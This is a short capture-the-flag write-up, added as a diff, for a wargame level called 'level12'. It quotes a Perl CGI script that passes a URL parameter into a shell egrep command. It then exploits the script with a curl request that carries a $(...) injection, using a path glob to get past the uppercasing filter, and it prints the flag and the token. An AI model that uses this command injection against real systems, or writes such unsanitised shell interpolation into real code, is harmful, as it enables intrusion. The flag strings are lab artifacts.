@@ -1,0 +1,28 @@
+## FLAG: `fa6v5ateaw21peobuub8ipe6s`
+
+> cat level12.pl
+```
+    ...
+    # localhost:4646
+    ...
+        $nn = $_[1];                            // $nn == Y parameter
+        $xx = $_[0];                            // $xx == X parameter
+        $xx =~ tr/a-z/A-Z/;                     // toupper sur $xx
+        $xx =~ s/\s.*//;                        // replace first occurence for \s.* by nothing ('\s' any whitespace, '.' any character, '*' unlimited previous) -> CANNOT HAVE WHITESPACE
+        @output = `egrep "^$xx" /tmp/xd 2>&1`;  // exec command 'egrep $xx /tmp 2>&1'
+    ...
+    n(t(param("x"), param("y")));
+```
+
+> vi /tmp/12_GETFLAG.SH
+```
+#!/bin/bash
+getflag > /tmp/12_res
+```
+
+> chmod +x /tmp/12_GETFLAG.SH
+> curl 'http://127.0.0.1:4646/?x=$(/*/12_GETFLAG.SH)&y=BAHRIEN'
+> cat /tmp/12_res
+```
+    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
